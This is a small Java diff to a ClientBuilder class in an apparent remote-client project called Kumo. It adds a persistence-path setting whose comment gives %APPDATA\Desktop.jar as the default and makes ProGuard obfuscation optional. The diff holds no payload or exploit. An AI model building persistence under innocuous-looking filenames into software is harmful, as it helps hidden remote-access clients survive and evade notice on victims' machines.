@@ -23,6 +23,7 @@ public class ClientBuilder {
     private String clientName;
     public static String jarCreatedBy = "";
     public static String jarVersion = "1.0";
+    public static String persistencePath = "{{DEFAULT}}"; // The client will use %APPDATA\Desktop.jar as a default
 
     public ClientBuilder(String clientName) {
         if (isDebug){
@@ -50,7 +51,7 @@ public class ClientBuilder {
         String jarFileName = System.getProperty("user.home") + "/Kumo/" + clientName + ".jar";
         File jarFile = new File(jarFileName);
         try {
-            byte buffer[] = new byte[1024];
+            byte[] buffer = new byte[1024];
             FileOutputStream stream = new FileOutputStream(jarFile);
             JarOutputStream out = new JarOutputStream(stream, manifest);
             ArrayList<File> fileList = new ArrayList<>();
@@ -90,7 +91,10 @@ public class ClientBuilder {
             }
             out.close();
             stream.close();
-            createProguardRules(jarFileName);
+
+            if (ClientBuilder.createProguard)
+                createProguardRules(jarFileName);
+
             Desktop.getDesktop().open(new File(System.getProperty("user.home") + "/Kumo/"));
             Logger.log(Level.INFO, "Build Complete!");
             FileUtils.deleteFiles();
